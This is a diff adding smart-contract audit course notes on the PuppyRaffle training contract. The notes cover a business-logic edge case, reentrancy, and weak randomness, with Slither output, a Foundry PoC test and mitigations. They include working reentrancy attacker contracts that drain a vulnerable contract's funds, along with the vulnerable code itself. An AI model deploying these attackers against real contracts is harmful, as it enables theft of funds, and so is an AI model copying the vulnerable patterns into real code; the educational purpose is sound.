@@ -84,6 +84,17 @@
 10. [Case Study: DoS](#case-study-dos)
 11. [DoS PoC](#dos-poc)
 12. [DoS: Reporting](#dos-reporting)
+13. [Exploit: Business logic edge case](#exploit-business-logic-edge-case)
+14. [Recon: Refund](#recon-refund)
+15. [Exploit: Reentrancy](#exploit-reentrancy)
+16. [Reentrancy: Mitigation](#reentrancy-mitigation)
+17. [Menace to Society](#menace-to-society)
+18. [Reentrancy PoC](#reentrancy-poc)
+19. [Recon Continued](#recon-continued)
+20. [Exploit: Weak Randomness](#exploit-weak-randomness)
+21. [Weak Randomness: Multiple issues](#weak-randomness-multiple-issues)
+22. [Case Study: Weak Randomness](#case-study-weak-randomness)
+23. [Weak Randomness: Mitigation](#weak-randomness-mitigation)
 
 </details>
 
@@ -1326,3 +1337,340 @@ function testDoS() public {
 - For this specific bug, the impact and likelihood are both probably M
 - Sometimes, we hold off on the report as we investigate further. We may find that our "bug" is intended behavior
 - In a private audit, you may not need to include the proof of code in the PoC section. But you should definitely do so in a competitive audit
+
+### Exploit: Business logic edge case
+```
+/// @notice a way to get the index in the array
+/// @param player the address of a player in the raffle
+/// @return the index of the player in the array, if they are not active, it returns 0
+function getActivePlayerIndex(address player) external view returns (uint256) {
+	for (uint256 i = 0; i < players.length; i++) {
+		if (players[i] == player) {
+			return i;
+		}
+	}
+	return 0;
+}
+```
+- This function returns 0 is the player isn't active
+- An inactive player could think that they are at index 0
+
+### Recon: Refund
+```js
+/// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
+/// @dev This function will allow there to be blank spots in the array
+function refund(uint256 playerIndex) public {
+	address playerAddress = players[playerIndex];
+	require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+	require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+	
+	payable(msg.sender).sendValue(entranceFee);
+
+	players[playerIndex] = address(0);
+	emit RaffleRefunded(playerAddress);
+}
+```
+- The `PuppyRaffle::players` array length will remain the same after the refund
+- There is a possible MEV exploit here (won't be covered, but is mentioned)
+- `Address::sendValue` is used to return the entrance fee
+```js
+require(address(this).balance >= amount, "Address: insufficient balance");
+```
+- Since is uses `address(this)`, we can reenter as long as there is an amount
+
+### Exploit: Reentrancy
+- [excalidraw](https://excalidraw.com/): Useful tool for making diagrams
+
+- If we run `slither .`, we can see on of the outputs related to the `PuppyRaffle::refund` function:
+```
+INFO:Detectors:
+Reentrancy in PuppyRaffle.refund(uint256) (src/PuppyRaffle.sol#94-101):
+        External calls:
+        - address(msg.sender).sendValue(entranceFee) (src/PuppyRaffle.sol#99)
+        State variables written after the call(s):
+        - players[playerIndex] = address(0) (src/PuppyRaffle.sol#99)
+        PuppyRaffle.players (src/PuppyRaffle.sol#21-23) can be used in cross function reentrancies:
+        - PuppyRaffle.enterRaffle(address[]) (src/PuppyRaffle.sol#77-88)
+        - PuppyRaffle.getActivePlayerIndex(address) (src/PuppyRaffle.sol#108-112)
+        - PuppyRaffle.players (src/PuppyRaffle.sol#21-23)
+        - PuppyRaffle.refund(uint256) (src/PuppyRaffle.sol#94-101)
+        - PuppyRaffle.selectWinner() (src/PuppyRaffle.sol#123-151)
+Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-1
+```
+- [Remix example](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js)
+- [sc exploits reentrancy](https://github.com/Cyfrin/sc-exploits-minimized/tree/main/src/reentrancy)
+- [solidity by example](https://solidity-by-example.org/hacks/re-entrancy/)
+```js
+contract ReentrancyVictim {
+    mapping(address => uint256) public userBalance;
+
+    function deposit() public payable {
+        userBalance[msg.sender] += msg.value;
+
+    }
+
+    function withdrawBalance() public {
+        uint256 balance = userBalance[msg.sender];
+
+        // An external call and then a state change!
+        // External call
+        (bool success,) = msg.sender.call{value: balance}("");
+        if (!success) {
+            revert();
+        }
+
+        // State change
+        userBalance[msg.sender] = 0;
+    }
+}
+```
+- The error here is making a state change after an external call
+
+**Normal Scenario**
+0. User A: 10 ether
+1. deposit {value: 10 ether}
+	- `userBalance[User A]` = 10 ether
+	- contract balance = 10 ether
+	- User A = 0 ether
+2. withdrawBalance
+	- `userBalance[UserA]` = 0 ether
+	- contract balance = 0 ether
+	- User A = 10 ether
+
+- An attacker will exploit the fact that a state change is made after an external call.
+	- This is done by creating a contract that will "reenter" by calling the withdraw function
+```js
+contract ReentrancyAttacker {
+    ReentrancyVictim victim;
+
+    constructor(ReentrancyVictim _victim) {
+        victim = _victim;
+    }
+
+    function attack() public payable {
+        victim.deposit{value: 1 ether}();
+        victim.withdrawBalance();
+    }
+
+    receive() external payable {
+        if (address(victim).balance >= 1 ether) {
+            victim.withdrawBalance();
+        }
+    }
+}
+```
+- The initial attack function makes a deposit and initiates a withdraw
+- Taking advantage of the fact that state changes are made after external calls, the receive function of the attack contract will keep calling withdraw as long as the contract holds at least 1 eth 
+
+**Exploit Scenario**
+1. Victim deposits 5 ether
+	- `userbalance[Victim]`: 5 ether
+	- contract balance: 5 ether
+	- Victim = -5 ether
+2. Attacker calls attack function
+	2a. Deposit 1 eth
+	- `userbalance[Victim]`: 5 ether
+	- `userbalance[Attacker]`: 1 ether
+	- contract balance: 6 ether
+	- Victim = -5 ether
+	- Attacker = -1 ether
+	2b. Attacker withdraws
+	2c. In the middle of the withdraw function, the receive is triggered
+	- `userbalance[Victim]`: 5 ether
+	- `userbalance[Attacker]`: 1 ether
+	- contract balance: 5 ether
+	- Victim = -5 ether
+	- Attacker = 0 ether
+	2d. Attacker reenters with the receive fallback calling withdraw
+	- `userbalance[Victim]`: 5 ether
+	- `userbalance[Attacker]`: 1 ether
+	- contract balance: 4 ether
+	- Victim = -5 ether
+	- Attacker = 1 ether
+3.  2d repeats until there is less than 1 ether
+	- `userbalance[Victim]`: 5 ether
+	- `userbalance[Attacker]`: 0 ether
+	- contract balance: 0 ether
+	- Victim = -5 ether
+	- Attacker = 6 ether
+
+### Reentrancy: Mitigation
+- The exploit is possible because the `userBalance` is updated after the withdraw
+- If the withdraw function looked like this:
+```js
+    function withdrawBalance() public {
+        uint256 balance = userBalance[msg.sender];
+
+	    // State change
+        userBalance[msg.sender] = 0;
+
+        // An external call and then a state change!
+        // External call
+        (bool success,) = msg.sender.call{value: balance}("");
+        if (!success) {
+            revert();
+        }
+    }
+}
+```
+- The attack contract would not be able to reenter
+- We follow the CEI (checks effects interactions) pattern to mitigate reentrancy
+	- First run checks (require statements, conditionals, etc.)
+	- Then run effects (update state of contract)
+	- Finally run interactions (calls to external contracts)
+
+- We could also mitigate reentrancy with a "lock"
+```js
+	bool locked = false;
+	
+    function withdrawBalance() public {
+	    if (locked) revert();
+	    locked = true;
+	    
+        uint256 balance = userBalance[msg.sender];
+
+	    // State change
+        userBalance[msg.sender] = 0;
+
+        // An external call and then a state change!
+        // External call
+        (bool success,) = msg.sender.call{value: balance}("");
+        if (!success) {
+            revert();
+        }
+
+		locked = false;
+    }
+}
+```
+- If locked is true, the attack contract will revert
+
+- We can also use [oz reentrancyguard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)
+
+### Menace to Society
+- Even though reentrancy is well known, it was one of the top 10 defi hacks of 2023
+- [Case Study: DAO Hack](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao)
+    - [Still plagues us today](https://github.com/pcaversaccio/reentrancy-attacks)
+- [Exercises](https://github.com/Cyfrin/sc-exploits-minimized/tree/main/src/reentrancy)
+    - [Search "reentrancy" in Solodit](https://solodit.xyz/)
+- Prevention:
+    - CEI/CEII ( FREI-PI soon!)
+    - NonReentrant modifiers
+- [Read only reentrancy](https://officercia.mirror.xyz/DBzFiDuxmDOTQEbfXhvLdK0DXVpKu1Nkurk0Cqk3QKc)
+
+**Recap**
+- An attacker calls the victim contract
+- The victim contract is made to call an external contract
+- The external contract recalls the victim contract
+- This process of the victim contract and the external contract calling each other repeats
+- This process is only possible because state change in the victim contract occurs after the external call
+
+### Reentrancy PoC
+```js
+     function testReentrancy() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+        uint256 startingAttackerContractBalance = address(attackerContract).balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
+
+        //attack
+        vm.prank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("attack start: ", startingAttackerContractBalance);
+        console.log("contract start: ", startingContractBalance);
+        console.log("attack end: ", address(attackerContract).balance);
+        console.log("contract end: ", address(puppyRaffle).balance);
+    }
+```
+
+```js
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entraceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entraceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory player = new address[](1);
+        player[0] = address(this);
+        puppyRaffle.enterRaffle{value: entraceFee}(player);
+ 
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if (address(puppyRaffle).balance >= entraceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+}
+```
+
+### Recon Continued
+- Sometimes recon can occur at the start and you highlight all the possible bugs
+	- More often, recon is continuous
+	- After identifying and creating a report for one finding, the recon phase continues
+- In `PuppyRaffle::selectWinner`, we identify a weak randomness exploit
+- The winner is calculated based on this equation:
+```js
+uint256 winnerIndex =
+            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
+```
+
+### Exploit: Weak Randomness
+- Using `slither .`
+```
+INFO:Detectors:
+PuppyRaffle.selectWinner() (src/PuppyRaffle.sol#123-151) uses a weak PRNG: "winnerIndex = uint256(keccak256(bytes)(abi.encodePacked(msg.sender,block.timestamp,block.difficulty))) % players.length (src/PuppyRaffle.sol#126-128)"
+Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#weak-PRNG
+```
+- [Weak PRNG](https://github.com/crytic/slither/wiki/Detector-Documentation#weak-PRNG)
+- [Weak randomness remix](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/weak-randomness/WeakRandomness.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js)
+- [sc exploits](https://github.com/Cyfrin/sc-exploits-minimized/tree/main/src/weak-randomness)
+
+### Weak Randomness: Multiple issues
+- Miners can manipulate the "random number"
+	- The can hold on to the tx if the `block.timestamp` isn't favorable
+- [block.prevrandao](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties)
+	- random number provided by the beacon chain
+	- [EIP 4399](https://eips.ethereum.org/EIPS/eip-4399)
+- using `msg.sender`
+	- A caller could mine for addresses until they find one that gets the random number they want???
+
+### Case Study: Weak Randomness
+- [Meebits oz forum](https://forum.openzeppelin.com/t/understanding-the-meebits-exploit/8281)
+- An nft collection based on rarity??? which was generated using the same type of formula as with PuppyRaffle
+	- The attacker was able to "reroll" mints until they got the rare one which was later sold for a lot
+	- The is exploit took 6 hours and thousands of dollars of gas
+- [Decompile bytecode for unverified contracts](https://app.dedaub.com/)
+	- Use this for attack contracts that aren't verified
+- [Tenderly](https://tenderly.co/)
+	- Trace transactions for more details
+- [Exercises](https://github.com/Cyfrin/sc-exploits-minimized/tree/main/src/weak-randomness)
+    - [Search "RNG" in Solodit](https://solodit.xyz/)
+
+### Weak Randomness: Mitigation
+- Some ways to mitigate would be to use Chainlink VRF, commit reveal scheme???, blockhash
